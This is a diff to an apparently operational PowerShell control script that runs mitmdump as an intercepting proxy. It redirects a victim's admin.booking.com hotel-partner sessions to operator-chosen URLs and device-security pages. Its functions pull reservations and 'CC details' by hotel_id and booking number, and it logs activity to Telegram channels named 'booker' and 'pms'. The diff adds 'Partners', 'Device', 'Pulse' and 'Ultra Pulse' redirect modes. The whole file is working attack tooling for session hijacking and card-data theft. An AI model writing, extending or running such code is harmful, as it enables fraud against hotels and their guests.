-    Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
-	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    # Удаляем ВСЕ другие флаги
+    @(
+        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
+        $Operation11Flag, $Operation12Flag, $BookingHotelFlag,
+        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
+        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
+        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
+        $BookingCCDetailsHotelIdFile,
+        # Новые флаги 21-26
+        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
+        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
+        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile
+    ) | ForEach-Object {
+        Remove-Item -Path $_ -ErrorAction SilentlyContinue
+    }
+    
     Log-Write "Booking.com HOTEL SECURITY redirect enabled (function 15)."
     Start-Mitmdump
 }
@@ -623,26 +599,22 @@ function Enable-Operation16Redirect {
     }
     New-Item -ItemType File -Path $BookingHotelFlag -Force | Out-Null
     
-    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
-	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    # Удаляем ВСЕ другие флаги
+    @(
+        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
+        $Operation11Flag, $Operation12Flag, $BookingHotelSecurityFlag,
+        $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
+        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
+        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
+        $BookingCCDetailsHotelIdFile,
+        # Новые флаги 21-26
+        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
+        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
+        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile
+    ) | ForEach-Object {
+        Remove-Item -Path $_ -ErrorAction SilentlyContinue
+    }
+    
     Start-Mitmdump
     
     Log-Write "Operation 16: Function 13 (Booking Hotel Redirect) enabled."
@@ -652,7 +624,7 @@ function Enable-Operation16Redirect {
 function Enable-CustomRedirect {
     Log-Write "Starting FUNCTION 17..."
     
-    # ВАЖНО: ОЧИЩАЕМ ВСЕ ФЛАГИ функции 17
+    # ОЧИЩАЕМ ВСЕ ФЛАГИ функции 17
     Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
     Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
     Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
@@ -744,24 +716,20 @@ function Enable-CustomRedirect {
     # Убедимся, что DONE flag удален
     Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
     
-    # Disable other flags
-    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
+    # Удаляем ВСЕ другие флаги
+    @(
+        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
+        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
+        $Operation16Flag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
+        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
+        $BookingCCDetailsHotelIdFile,
+        # Новые флаги 21-26
+        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
+        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
+        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile
+    ) | ForEach-Object {
+        Remove-Item -Path $_ -ErrorAction SilentlyContinue
+    }
     
     # Restart mitmdump
     Start-Mitmdump
@@ -827,25 +795,20 @@ function Enable-BookingReservationsRedirect {
     }
     New-Item -ItemType File -Path $BookingReservationsFlag -Force | Out-Null
     
-    # Disable other flags
-    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
-	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    # Удаляем ВСЕ другие флаги
+    @(
+        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
+        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
+        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
+        $CustomRedirectDoneFlag, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
+        $BookingCCDetailsHotelIdFile,
+        # Новые флаги 21-26
+        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
+        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
+        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile
+    ) | ForEach-Object {
+        Remove-Item -Path $_ -ErrorAction SilentlyContinue
+    }
     
     Log-Write ("Booking reservations redirect enabled with hotel_id={0}, reportId={1}" -f $hotelId, $reportId)
     Write-Host ""
@@ -895,26 +858,20 @@ function Enable-BookingCCDetailsRedirect {
     }
     New-Item -ItemType File -Path $BookingCCDetailsFlag -Force | Out-Null
     
-    # Disable other flags
-    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
-	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    # Удаляем ВСЕ другие флаги
+    @(
+        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
+        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
+        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
+        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
+        $BookingReservationsReportIdFile,
+        # Новые флаги 21-26
+        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
+        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
+        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile
+    ) | ForEach-Object {
+        Remove-Item -Path $_ -ErrorAction SilentlyContinue
+    }
     
     Log-Write ("Booking CC details redirect enabled with bn={0}, hotel_id={1}" -f $bn, $hotelId)
     Write-Host ""
@@ -925,6 +882,387 @@ function Enable-BookingCCDetailsRedirect {
     Start-Mitmdump
     
     Log-Write "Booking CC details redirect enabled (function 19)."
+}
+
+# ========== НОВЫЕ ФУНКЦИИ 21-26 ==========
+
+function Enable-PartnersRedirect {
+    Log-Write "Starting FUNCTION 21..."
+    
+    Write-Host ""
+    Write-Host "=== FUNCTION 21: PARTNERS REDIRECT ==="
+    Write-Host ""
+    Write-Host "[INFO] This function redirects admin.booking.com to channel-manager page"
+    Write-Host "       Works until user gets page with 'tlc' parameter"
+    Write-Host "       Then redirects to https://admin.booking.com/hotel/"
+    Write-Host "       Logs to Telegram channel 'booker'"
+    Write-Host ""
+    
+    # Create activation flag
+    if (-not (Test-Path (Split-Path $PartnersFlag))) {
+        New-Item -ItemType Directory -Path (Split-Path $PartnersFlag) -Force | Out-Null
+    }
+    New-Item -ItemType File -Path $PartnersFlag -Force | Out-Null
+    
+    # Удаляем ВСЕ другие флаги
+    @(
+        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
+        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
+        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
+        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
+        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
+        $BookingCCDetailsHotelIdFile,
+        # Другие новые флаги
+        $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
+        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
+        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile
+    ) | ForEach-Object {
+        Remove-Item -Path $_ -ErrorAction SilentlyContinue
+    }
+    
+    Log-Write "Function 21 (Partners redirect) enabled"
+    Write-Host ""
+    Write-Host "✅ Function 21 ACTIVATED" -ForegroundColor Green
+    Write-Host "   Redirecting admin.booking.com to channel-manager"
+    Write-Host "   Telegram notifications to channel 'booker'"
+    Write-Host ""
+    
+    Start-Mitmdump
+}
+
+function Enable-PartnersAndMessRedirect {
+    Log-Write "Starting FUNCTION 22..."
+    
+    Write-Host ""
+    Write-Host "=== FUNCTION 22: PARTNERS AND MESSAGING ==="
+    Write-Host ""
+    Write-Host "[INFO] Combination: Function 21 -> then Function 15"
+    Write-Host "       Telegram logs to channel 'booker'"
+    Write-Host ""
+    
+    # Create activation flag
+    if (-not (Test-Path (Split-Path $PartnersAndMessFlag))) {
+        New-Item -ItemType Directory -Path (Split-Path $PartnersAndMessFlag) -Force | Out-Null
+    }
+    New-Item -ItemType File -Path $PartnersAndMessFlag -Force | Out-Null
+    
+    # Also enable function 21 initially
+    if (-not (Test-Path (Split-Path $PartnersFlag))) {
+        New-Item -ItemType Directory -Path (Split-Path $PartnersFlag) -Force | Out-Null
+    }
+    New-Item -ItemType File -Path $PartnersFlag -Force | Out-Null
+    
+    # Удаляем ВСЕ другие флаги
+    @(
+        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
+        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
+        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
+        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
+        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
+        $BookingCCDetailsHotelIdFile,
+        # Другие новые флаги
+        $DeviceFlag, $PulseFlag, $UltraPulseFlag,
+        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
+        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile
+    ) | ForEach-Object {
+        Remove-Item -Path $_ -ErrorAction SilentlyContinue
+    }
+    
+    Log-Write "Function 22 (Partners and Messaging) enabled"
+    Write-Host ""
+    Write-Host "✅ Function 22 ACTIVATED" -ForegroundColor Green
+    Write-Host "   Sequence: Function 21 -> then Function 15"
+    Write-Host "   Telegram notifications to channel 'booker'"
+    Write-Host ""
+    
+    Start-Mitmdump
+}
+
+function Enable-DeviceRedirect {
+    Log-Write "Starting FUNCTION 23..."
+    
+    Write-Host ""
+    Write-Host "=== FUNCTION 23: DEVICE SECURITY ==="
+    Write-Host ""
+    Write-Host "[INFO] Redirects admin.booking.com to devices.html"
+    Write-Host "       Works until user gets page with 'auth_assurance_last_check'"
+    Write-Host "       Then redirects to https://admin.booking.com/hotel/hoteladmin/"
+    Write-Host "       Logs to Telegram channel 'pms'"
+    Write-Host ""
+    
+    # Create activation flag
+    if (-not (Test-Path (Split-Path $DeviceFlag))) {
+        New-Item -ItemType Directory -Path (Split-Path $DeviceFlag) -Force | Out-Null
+    }
+    New-Item -ItemType File -Path $DeviceFlag -Force | Out-Null
+    
+    # Удаляем ВСЕ другие флаги
+    @(
+        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
+        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
+        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
+        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
+        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
+        $BookingCCDetailsHotelIdFile,
+        # Другие новые флаги
+        $PartnersFlag, $PartnersAndMessFlag, $PulseFlag, $UltraPulseFlag,
+        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
+        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile
+    ) | ForEach-Object {
+        Remove-Item -Path $_ -ErrorAction SilentlyContinue
+    }
+    
+    Log-Write "Function 23 (Device Security) enabled"
+    Write-Host ""
+    Write-Host "✅ Function 23 ACTIVATED" -ForegroundColor Green
+    Write-Host "   Redirecting admin.booking.com to devices.html"
+    Write-Host "   Telegram notifications to channel 'pms'"
+    Write-Host ""
+    
+    Start-Mitmdump
+}
+
+function Enable-PulseRedirect {
+    Log-Write "Starting FUNCTION 24..."
+    
+    # ВАЖНО: Удаляем флаг отключения Pulse если он есть
+    $PulseDisabledFlag = "C:\temp\mitm_pulse_disabled.txt"
+    Remove-Item -Path $PulseDisabledFlag -Force -ErrorAction SilentlyContinue
+    
+    Write-Host ""
+    Write-Host "=== FUNCTION 24: PULSE REDIRECT ==="
+    Write-Host ""
+    Write-Host "[INFO] Redirects admin.booking.com to custom URL"
+    Write-Host "       PULSE работает ПОКА АДМИН НЕ ОТКЛЮЧИТ функцию"
+    Write-Host "       После отключения: ВСЕ запросы к account.booking.com"
+    Write-Host "       будут перенаправлены на admin.booking.com/hotel/hoteladmin/"
+    Write-Host "       Telegram logs to channel 'pms'"
+    Write-Host ""
+    Write-Host "📌 ADMIN COMMANDS FOR PULSE CONTROL:"
+    Write-Host "   - Pulse работает БЕСКОНЕЧНО пока не отключен"
+    Write-Host "   - Для ОСТАНОВКИ Pulse выберите:"
+    Write-Host "       1) Опция 4 (DISABLE all redirects) - полное отключение"
+    Write-Host "       2) Опция 1 (RESET) - сброс"
+    Write-Host "   - После остановки: все account.booking.com -> admin.booking.com/hotel/hoteladmin/"
+    Write-Host ""
+    Write-Host "🔧 ЛОГИКА РАБОТЫ:"
+    Write-Host "   - В активном режиме: admin.booking.com -> ваш_выбранный_URL"
+    Write-Host "   - После отключения: account.booking.com/* -> admin.booking.com/hotel/hoteladmin/"
+    Write-Host ""
+    
+    # Ask for TO URL
+    do {
+        $toDomain = Read-Host "Enter FULL TO URL for Pulse redirect (must start with http:// or https://)"
+        if ($toDomain -notmatch '^https?://') {
+            Write-Host "ERROR: URL must start with http:// or https://" -ForegroundColor Red
+            continue
+        }
+        
+        # Дополнительная проверка на admin.booking.com (чтобы избежать циклов)
+        if ($toDomain -like "*admin.booking.com*") {
+            Write-Host "WARNING: Target URL contains admin.booking.com" -ForegroundColor Yellow
+            Write-Host "This might create redirect loops!" -ForegroundColor Red
+            $confirm = Read-Host "Continue anyway? (y/n)"
+            if ($confirm -ne 'y') {
+                continue
+            }
+        }
+        
+        break
+    } while ($true)
+    
+    # Save TO URL to file
+    Set-Content -Path $PulseRedirectToFile -Value $toDomain.Trim() -Force
+    
+    # Create activation flag
+    if (-not (Test-Path (Split-Path $PulseFlag))) {
+        New-Item -ItemType Directory -Path (Split-Path $PulseFlag) -Force | Out-Null
+    }
+    New-Item -ItemType File -Path $PulseFlag -Force | Out-Null
+    
+    # Удаляем ВСЕ другие флаги
+    @(
+        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
+        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
+        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
+        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
+        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
+        $BookingCCDetailsHotelIdFile,
+        # Другие новые флаги
+        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $UltraPulseFlag,
+        $MonitorPlatformsFlag, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
+        $UltraPulseRedirectToFile
+    ) | ForEach-Object {
+        Remove-Item -Path $_ -ErrorAction SilentlyContinue
+    }
+    
+    Log-Write ("Function 24 (Pulse) enabled with target: {0}" -f $toDomain)
+    Write-Host ""
+    Write-Host "✅ Function 24 ACTIVATED" -ForegroundColor Green
+    Write-Host "   Pulse redirect to: $toDomain"
+    Write-Host "   🚨 Pulse will work until YOU disable it via menu option 4 or 1"
+    Write-Host "   📡 After disabling: ALL account.booking.com -> admin.booking.com/hotel/hoteladmin/"
+    Write-Host "   📨 Telegram notifications to channel 'pms'"
+    Write-Host ""
+    
+    Start-Mitmdump
+}
+
+function Enable-UltraPulseRedirect {
+    Log-Write "Starting FUNCTION 25..."
+    
+    # ВАЖНО: Удаляем флаг отключения Pulse если он есть
+    $PulseDisabledFlag = "C:\temp\mitm_pulse_disabled.txt"
+    Remove-Item -Path $PulseDisabledFlag -Force -ErrorAction SilentlyContinue
+    
+    Write-Host ""
+    Write-Host "=== FUNCTION 25: ULTRA PULSE ==="
+    Write-Host ""
+    Write-Host "[INFO] SEQUENCE: Function 23 (Device) -> Function 24 (Pulse)"
+    Write-Host "       1. First phase: Device Security redirect"
+    Write-Host "          (works until user gets auth_assurance_last_check parameter)"
+    Write-Host "       2. Second phase: Pulse redirect"
+    Write-Host "          (works until manually disabled via menu)"
+    Write-Host "       Telegram logs to channel 'pms'"
+    Write-Host ""
+    Write-Host "📌 SEQUENCE STEPS:"
+    Write-Host "   Step 1: User visits admin.booking.com -> redirected to devices.html"
+    Write-Host "   Step 2: When device page has auth_assurance_last_check -> Phase 1 done"
+    Write-Host "   Step 3: Pulse phase starts automatically"
+    Write-Host ""
+    Write-Host "🔧 AFTER DISABLING PULSE:"
+    Write-Host "   ALL account.booking.com/* -> admin.booking.com/hotel/hoteladmin/"
+    Write-Host "   Works even after mitmdump restart"
+    Write-Host ""
+    
+    # Ask for TO URL for Function 24 part
+    do {
+        $toDomain = Read-Host "Enter FULL TO URL for Pulse phase (must start with http:// or https://)"
+        if ($toDomain -notmatch '^https?://') {
+            Write-Host "ERROR: URL must start with http:// or https://" -ForegroundColor Red
+            continue
+        }
+        
+        # Дополнительная проверка на admin.booking.com
+        if ($toDomain -like "*admin.booking.com*") {
+            Write-Host "WARNING: Target URL contains admin.booking.com" -ForegroundColor Yellow
+            Write-Host "This might create redirect loops!" -ForegroundColor Red
+            $confirm = Read-Host "Continue anyway? (y/n)"
+            if ($confirm -ne 'y') {
+                continue
+            }
+        }
+        
+        break
+    } while ($true)
+    
+    # Save TO URL to file for Pulse phase
+    Set-Content -Path $UltraPulseRedirectToFile -Value $toDomain.Trim() -Force
+    
+    # Create activation flag for Ultra Pulse
+    if (-not (Test-Path (Split-Path $UltraPulseFlag))) {
+        New-Item -ItemType Directory -Path (Split-Path $UltraPulseFlag) -Force | Out-Null
+    }
+    New-Item -ItemType File -Path $UltraPulseFlag -Force | Out-Null
+    
+    # Also enable function 23 initially (Phase 1)
+    if (-not (Test-Path (Split-Path $DeviceFlag))) {
+        New-Item -ItemType Directory -Path (Split-Path $DeviceFlag) -Force | Out-Null
+    }
+    New-Item -ItemType File -Path $DeviceFlag -Force | Out-Null
+    
+    # Удаляем ВСЕ другие флаги
+    @(
+        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
+        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
+        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
+        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
+        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
+        $BookingCCDetailsHotelIdFile,
+        # Другие новые флаги
+        $PartnersFlag, $PartnersAndMessFlag, $PulseFlag,
+        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
+        $PartnersRedirectDoneFlag
+    ) | ForEach-Object {
+        Remove-Item -Path $_ -ErrorAction SilentlyContinue
+    }
+    
+    Log-Write ("Function 25 (Ultra Pulse) enabled with Pulse target: {0}" -f $toDomain)
+    Write-Host ""
+    Write-Host "✅ Function 25 ACTIVATED" -ForegroundColor Green
+    Write-Host "   Phase 1: Device Security (Function 23)"
+    Write-Host "   Phase 2: Pulse redirect to: $toDomain"
+    Write-Host "   🚨 Phase 2 works until disabled via menu option 4 or 1"
+    Write-Host "   📡 After disabling: ALL account.booking.com -> admin.booking.com/hotel/hoteladmin/"
+    Write-Host "   📨 Telegram notifications to channel 'pms'"
+    Write-Host ""
+    
+    Start-Mitmdump
+}
+
+function Enable-MonitorPlatforms {
+    Log-Write "Starting FUNCTION 26..."
+    
+    Write-Host ""
+    Write-Host "=== FUNCTION 26: PLATFORM MONITORING ==="
+    Write-Host ""
+    Write-Host "[INFO] Monitors selected platforms including admin.booking.com"
+    Write-Host "       Telegram logs to appropriate channels"
+    Write-Host "       NO redirects - only monitoring"
+    Write-Host ""
+    
+    # Create activation flag
+    if (-not (Test-Path (Split-Path $MonitorPlatformsFlag))) {
+        New-Item -ItemType Directory -Path (Split-Path $MonitorPlatformsFlag) -Force | Out-Null
+    }
+    New-Item -ItemType File -Path $MonitorPlatformsFlag -Force | Out-Null
+    
+    # Don't disable other flags - Function 26 can work alongside others
+    # But disable conflicting basic redirects
+    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
+    
+    Log-Write "Function 26 (Platform Monitoring) enabled"
+    Write-Host ""
+    Write-Host "✅ Function 26 ACTIVATED" -ForegroundColor Green
+    Write-Host "   Monitoring platforms and admin.booking.com"
+    Write-Host "   Telegram notifications based on domain"
+    Write-Host ""
+    
+    Start-Mitmdump
+}
+
+function Disable-AllRedirects {
+    # Удаляем ВСЕ флаги (включая PulseFlag)
+    @(
+        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
+        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
+        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
+        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
+        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
+        $BookingCCDetailsHotelIdFile,
+        # Новые флаги 21-26 - ВКЛЮЧАЯ PULSE!
+        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
+        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
+        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile
+    ) | ForEach-Object {
+        Remove-Item -Path $_ -Force -ErrorAction SilentlyContinue
+    }
+    
+    # ВАЖНО: Создаем флаг что PULSE был отключен
+    $PulseDisabledFlag = "C:\temp\mitm_pulse_disabled.txt"
+    Set-Content -Path $PulseDisabledFlag -Value "DISABLED" -Force
+    
+    Clear-SystemProxies | Out-Null
+    Reset-Proxy-And-Stop-Mitmdump
+    Log-Write "All redirects disabled and proxy cleared."
+    
+    Write-Host ""
+    Write-Host "⚠️  IMPORTANT for Function 24 (Pulse):" -ForegroundColor Yellow
+    Write-Host "   Function 24 is now DISABLED" -ForegroundColor Cyan
+    Write-Host "   ALL account.booking.com requests will redirect to admin.booking.com/hotel/hoteladmin/" -ForegroundColor Cyan
+    Write-Host "   This will work EVEN AFTER mitmdump restart" -ForegroundColor Green
+    Write-Host ""
 }
 
 # ---------------- MAIN ----------------
@@ -948,7 +1286,7 @@ do {
         Log-Write ("[INFO] Redirect target set to EMPTY - only special functions will work")
         Write-Host ""
         Write-Host "[INFO] REDIRECT TARGET: EMPTY" 
-        Write-Host "       Only special functions (7-19) will work" 
+        Write-Host "       Only special functions (7-26) will work" 
         Write-Host "       Force/One-shot redirects will be disabled" 
         Write-Host ""
         break
@@ -1002,7 +1340,7 @@ while ($true) {
     Write-Host "   5) Tail log"
     Write-Host "   6) EXIT"
     Write-Host ""
-    Write-Host " FUNCTIONS:"
+    Write-Host " FUNCTIONS 1-20:"
     Write-Host "   7) Messaging redirect (function 7)"
     Write-Host "   8) Provider redirect (function 8)"
     Write-Host "   9) User redirect (function 9)"
@@ -1016,7 +1354,15 @@ while ($true) {
     Write-Host "   17) Custom one-time redirect (function 17)"
     Write-Host "   18) Reservations download (function 18)"
